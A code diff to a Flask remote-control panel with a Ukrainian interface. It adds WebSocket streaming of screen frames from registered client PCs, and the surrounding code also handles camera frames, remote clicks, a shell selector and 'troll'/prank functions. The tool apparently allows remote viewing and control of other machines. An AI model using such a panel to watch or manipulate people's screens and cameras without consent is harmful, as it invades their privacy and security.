@@ -35,6 +35,13 @@ from flask import (
     redirect, render_template_string, request, send_file, session, url_for,
 )
 
+try:
+    from flask_sock import Sock  # type: ignore
+    FLASK_SOCK_AVAILABLE = True
+except Exception:
+    Sock = None  # type: ignore
+    FLASK_SOCK_AVAILABLE = False
+
 # ---------------------------------------------------------------------------
 # Optional packages: missing optional packages must never prevent Render boot.
 # ---------------------------------------------------------------------------
@@ -520,6 +527,15 @@ TROLL_FUNCS = {
 # --- Flask app ---
 app = Flask(__name__)
 app.secret_key = SECRET_KEY
+
+# WebSocket transport for low-latency screen frames. HTTP/MJPEG stays as a fallback.
+SOCK = None
+if FLASK_SOCK_AVAILABLE:
+    try:
+        SOCK = Sock(app)
+    except Exception:
+        SOCK = None
+
 @app.route("/api/volume", methods=["GET", "POST"])
 @login_required
 def api_volume():
@@ -2084,7 +2100,12 @@ def fullscreen_page():
         return redirect(url_for("index"))
     theme = session.get('theme', DEFAULT_THEME)
     neon, muted = get_theme_colors(theme)
-    return render_template_string(FULLSCREEN_TEMPLATE, theme=theme, neon=neon, muted=muted, themes_list=sorted(THEMES.keys()))
+    with REMOTE_LOCK:
+        selected_cid = session.get("selected_client")
+        selected_obj = REMOTE_CLIENTS.get(selected_cid) if selected_cid else None
+        if not selected_obj or not _client_online(selected_obj):
+            selected_cid = None
+    return render_template_string(FULLSCREEN_TEMPLATE, theme=theme, neon=neon, muted=muted, themes_list=sorted(THEMES.keys()), selected_client_id=selected_cid)
 
 @app.route("/fs_action_click", methods=["POST"])
 @login_required
@@ -2705,7 +2726,7 @@ input[type=range]::-webkit-slider-thumb {
   <div class="main">
     <div class="card collapsible">
       <div class="stat-header"><b>🖥 Демонстрація</b><button class="collapse-btn" type="button" onclick="toggleBlock('screenBlock',this)">Сховати</button></div>
-      <div id="screenBlock" class="collapsible-body"><img src="{{ url_for('screen_feed', cid=selected_client_id) }}" class="screen"></div>
+      <div id="screenBlock" class="collapsible-body"><img id="screenView" data-cid="{{ selected_client_id or '' }}" class="screen" alt="screen"></div>
     </div>
 
     <div class="card collapsible">
@@ -2885,11 +2906,78 @@ function setShell(v,b){
   b.classList.add('active');
 }
 
+let activeScreenSocket = null;
+let activeScreenImage = null;
+let activeScreenFallbackTimer = null;
+
+function wsScreenUrl(cid){
+  const proto = location.protocol === "https:" ? "wss" : "ws";
+  return proto + "://" + location.host + "/ws/screen/" + encodeURIComponent(cid);
+}
+
+function startScreenStream(img){
+  if(!img) return;
+  const cid = img.dataset.cid || "";
+  if(!cid) return;
+  activeScreenImage = img;
+  if(activeScreenSocket){ try{activeScreenSocket.close();}catch(e){} activeScreenSocket=null; }
+  if(activeScreenFallbackTimer){ clearTimeout(activeScreenFallbackTimer); activeScreenFallbackTimer=null; }
+
+  let socket;
+  try { socket = new WebSocket(wsScreenUrl(cid)); }
+  catch(e){ socket = null; }
+  if(!socket){
+    img.src = "/screen_feed?cid=" + encodeURIComponent(cid);
+    return;
+  }
+  socket.binaryType = "arraybuffer";
+  socket.onopen = () => { activeScreenSocket = socket; };
+  socket.onmessage = (ev) => {
+    const blob = new Blob([ev.data], {type:"image/jpeg"});
+    const nextUrl = URL.createObjectURL(blob);
+    const prevUrl = img.dataset.objectUrl;
+    img.onload = () => {
+      if(prevUrl) { try{URL.revokeObjectURL(prevUrl);}catch(e){} }
+    };
+    img.src = nextUrl;
+    img.dataset.objectUrl = nextUrl;
+  };
+  socket.onerror = () => {
+    try{socket.close();}catch(e){}
+    activeScreenSocket = null;
+    activeScreenFallbackTimer = setTimeout(() => {
+      img.src = "/screen_feed?cid=" + encodeURIComponent(cid);
+    }, 250);
+  };
+  socket.onclose = () => {
+    if(activeScreenSocket === socket) activeScreenSocket = null;
+    if(!img.src || !img.src.includes("/screen_feed")){
+      activeScreenFallbackTimer = setTimeout(() => {
+        img.src = "/screen_feed?cid=" + encodeURIComponent(cid);
+      }, 250);
+    }
+  };
+}
+
+function setScreenStreamVisible(visible){
+  if(!activeScreenImage) return;
+  if(!visible){
+    if(activeScreenSocket){ try{activeScreenSocket.close();}catch(e){} activeScreenSocket=null; }
+    if(activeScreenFallbackTimer){ clearTimeout(activeScreenFallbackTimer); activeScreenFallbackTimer=null; }
+    activeScreenImage.removeAttribute("src");
+  } else {
+    startScreenStream(activeScreenImage);
+  }
+}
+
 function toggleBlock(id, btn){
   const el=document.getElementById(id);
   if(!el)return;
   const hidden=el.classList.toggle('hidden');
   btn.textContent=hidden?'Показати':'Сховати';
+  if(id === 'screenBlock' && typeof setScreenStreamVisible === 'function'){
+    setScreenStreamVisible(!hidden);
+  }
 }
 
 const cpuCanvas=document.getElementById("cpuChart");
@@ -2943,6 +3031,10 @@ function startDisco(){
   const sec = document.getElementById("discoSec").value;
   fetch("/prank/disco?sec=" + sec);
 }
+
+
+const initialScreen = document.getElementById("screenView");
+if(initialScreen){ startScreenStream(initialScreen); }
 </script>
 <script>
 let trollHoverTimer = null;
@@ -3889,7 +3981,7 @@ body{background:#02030a;color:var(--neon);font-family:Inter;padding:8px}
   <a class="btn" href="{{ url_for('index') }}">🏠 На головну</a>
   <hr>
   <div>
-    <img id="screen" src="{{ url_for('screen_feed') }}">
+    <img id="screen" data-cid="" alt="screen">
   </div>
   <div class="controls">
     <div>Клік по зображенню — відправка координат (лівий клік). Перетягування миші не реалізовано тут.</div>
@@ -3909,6 +4001,26 @@ body{background:#02030a;color:var(--neon);font-family:Inter;padding:8px}
 
 <script>
 const screen = document.getElementById("screen");
+const screenCid = screen.dataset.cid || "";
+let screenWS = null;
+function screenWSUrl(cid){
+  const proto = location.protocol === "https:" ? "wss" : "ws";
+  return proto + "://" + location.host + "/ws/screen/" + encodeURIComponent(cid);
+}
+function connectScreen(){
+  if(!screenCid) return;
+  try { screenWS = new WebSocket(screenWSUrl(screenCid)); } catch(e){ screen.src = "/screen_feed?cid=" + encodeURIComponent(screenCid); return; }
+  screenWS.binaryType = "arraybuffer";
+  screenWS.onmessage = ev => {
+    const url = URL.createObjectURL(new Blob([ev.data], {type:"image/jpeg"}));
+    const old = screen.dataset.objectUrl;
+    screen.onload = () => { if(old) { try{URL.revokeObjectURL(old);}catch(e){} } };
+    screen.src = url; screen.dataset.objectUrl = url;
+  };
+  screenWS.onerror = () => { try{screenWS.close();}catch(e){}; screenWS=null; screen.src = "/screen_feed?cid=" + encodeURIComponent(screenCid); };
+  screenWS.onclose = () => { if(screenWS) screenWS=null; if(!screen.src) screen.src = "/screen_feed?cid=" + encodeURIComponent(screenCid); };
+}
+connectScreen();
 function postJSON(u, data){ fetch(u, {method:"POST", headers:{'Content-Type':'application/json'}, body: JSON.stringify(data)}).then(r=>r.json()).then(console.log).catch(()=>{}); }
 
 screen.addEventListener("click", function(e){
@@ -3963,9 +4075,29 @@ FULLSCREEN_TEMPLATE = r"""
 <style>body{margin:0;background:#000;overflow:hidden}#screen{width:100vw;height:100vh;display:block;cursor:crosshair}</style>
 </head>
 <body>
-<img id="screen" src="{{ url_for('screen_feed') }}">
+<img id="screen" data-cid="{{ selected_client_id or '' }}" alt="screen">
 <script>
 const img = document.getElementById("screen");
+const screenCid = img.dataset.cid || "";
+let screenWS = null;
+function screenWSUrl(cid){
+  const proto = location.protocol === "https:" ? "wss" : "ws";
+  return proto + "://" + location.host + "/ws/screen/" + encodeURIComponent(cid);
+}
+function connectScreen(){
+  if(!screenCid) return;
+  try { screenWS = new WebSocket(screenWSUrl(screenCid)); } catch(e){ img.src = "/screen_feed?cid=" + encodeURIComponent(screenCid); return; }
+  screenWS.binaryType = "arraybuffer";
+  screenWS.onmessage = ev => {
+    const url = URL.createObjectURL(new Blob([ev.data], {type:"image/jpeg"}));
+    const old = img.dataset.objectUrl;
+    img.onload = () => { if(old) { try{URL.revokeObjectURL(old);}catch(e){} } };
+    img.src = url; img.dataset.objectUrl = url;
+  };
+  screenWS.onerror = () => { try{screenWS.close();}catch(e){}; screenWS=null; img.src = "/screen_feed?cid=" + encodeURIComponent(screenCid); };
+  screenWS.onclose = () => { if(screenWS) screenWS=null; if(!img.src) img.src = "/screen_feed?cid=" + encodeURIComponent(screenCid); };
+}
+connectScreen();
 function postJSON(u, data){ fetch(u, {method:"POST", headers:{'Content-Type':'application/json'}, body: JSON.stringify(data)}); }
 img.addEventListener("click", function(e){
     const scaleX = img.naturalWidth / img.clientWidth;
@@ -4025,7 +4157,7 @@ def _save_client_registry():
         with REMOTE_LOCK:
             clean = {}
             for cid, c in REMOTE_CLIENTS.items():
-                clean[cid] = {k:v for k,v in c.items() if k not in {"jobs", "results", "screen_frame", "camera_frame"}}
+                clean[cid] = {k:v for k,v in c.items() if k not in {"jobs", "results", "screen_frame", "camera_frame", "ws_screen_clients"}}
         tmp = CLIENTS_FILE + ".tmp"
         with open(tmp, "w", encoding="utf-8") as f:
             json.dump(clean, f, ensure_ascii=False, indent=2)
@@ -4120,6 +4252,7 @@ def _remote_heartbeat():
             "name": "Unknown PC", "ip": "?", "caps": [], "last_seen": 0.0,
             "screen_frame": None, "camera_frame": None, "screen_viewed": 0.0,
             "camera_viewed": 0.0, "jobs": [], "results": {}, "cpu": None, "ram": None,
+            "screen_seq": 0, "camera_seq": 0, "ws_screen_clients": 0,
         })
         c["name"] = data.get("name") or c["name"]
         c["ip"] = request.remote_addr or c["ip"]
@@ -4189,6 +4322,7 @@ def _remote_upload_frame(cid: str):
         if not c:
             return "unknown client", 404
         c["screen_frame"] = data
+        c["screen_seq"] = int(c.get("screen_seq", 0)) + 1
         c["last_seen"] = time.time()
     return "OK"
 
@@ -4204,6 +4338,7 @@ def _remote_upload_camera(cid: str):
         if not c:
             return "unknown client", 404
         c["camera_frame"] = data
+        c["camera_seq"] = int(c.get("camera_seq", 0)) + 1
         c["last_seen"] = time.time()
     return "OK"
 
@@ -4234,6 +4369,84 @@ def _remote_job_status(job_id: str):
         return jsonify(done=False)
     return jsonify(done=True, result={k:v for k,v in result.items() if k != "_ts"})
 
+
+# ---------------------------------------------------------------------------
+# WebSocket screen transport (primary). The client pushes JPEG frames to the
+# server; the browser subscribes to the latest frames over another WebSocket.
+# Both endpoints require the existing client token / logged-in web session.
+# ---------------------------------------------------------------------------
+if SOCK is not None:
+    @SOCK.route("/ws/client/screen/<cid>")
+    def _ws_client_screen(ws, cid: str):
+        if request.headers.get("X-Client-Token", "") != CLIENT_TOKEN:
+            try:
+                ws.close()
+            except Exception:
+                pass
+            return
+        with REMOTE_LOCK:
+            c = REMOTE_CLIENTS.get(cid)
+            if not c:
+                return
+            c["ws_screen_clients"] = int(c.get("ws_screen_clients", 0)) + 1
+            c["last_seen"] = time.time()
+        try:
+            while True:
+                packet = ws.receive()
+                if packet is None:
+                    break
+                if isinstance(packet, str):
+                    if packet == "ping":
+                        try:
+                            ws.send("pong")
+                        except Exception:
+                            break
+                    continue
+                if not isinstance(packet, (bytes, bytearray)):
+                    continue
+                raw = bytes(packet)
+                if len(raw) > 4 * 1024 * 1024:
+                    continue
+                with REMOTE_LOCK:
+                    c = REMOTE_CLIENTS.get(cid)
+                    if not c:
+                        break
+                    c["screen_frame"] = raw
+                    c["screen_seq"] = int(c.get("screen_seq", 0)) + 1
+                    c["last_seen"] = time.time()
+        except Exception:
+            pass
+        finally:
+            with REMOTE_LOCK:
+                c = REMOTE_CLIENTS.get(cid)
+                if c:
+                    c["ws_screen_clients"] = max(0, int(c.get("ws_screen_clients", 1)) - 1)
+
+    @SOCK.route("/ws/screen/<cid>")
+    def _ws_browser_screen(ws, cid: str):
+        if session.get("logged_in") is not True or not has_screen_permission():
+            try:
+                ws.close()
+            except Exception:
+                pass
+            return
+        last_seq = -1
+        try:
+            while True:
+                with REMOTE_LOCK:
+                    c = REMOTE_CLIENTS.get(cid)
+                    if not c or not _client_online(c):
+                        break
+                    c["screen_viewed"] = time.time()
+                    frame = c.get("screen_frame")
+                    seq = int(c.get("screen_seq", 0))
+                if frame and seq != last_seq:
+                    ws.send(frame)
+                    last_seq = seq
+                time.sleep(0.015)
+        except Exception:
+            pass
+
 def _remote_mjpeg(cid: str, camera: bool=False):
     key = "camera_frame" if camera else "screen_frame"
     viewed = "camera_viewed" if camera else "screen_viewed"
@@ -4247,7 +4460,7 @@ def _remote_mjpeg(cid: str, camera: bool=False):
             online = _client_online(c)
         if frame and online:
             yield b"--frame\r\nContent-Type: image/jpeg\r\n\r\n" + frame + b"\r\n"
-        time.sleep(0.05)
+        time.sleep(0.04)
 
 # Remote-backed replacements for the same endpoint names used by z15 templates.
 def _adapt_screen_feed():
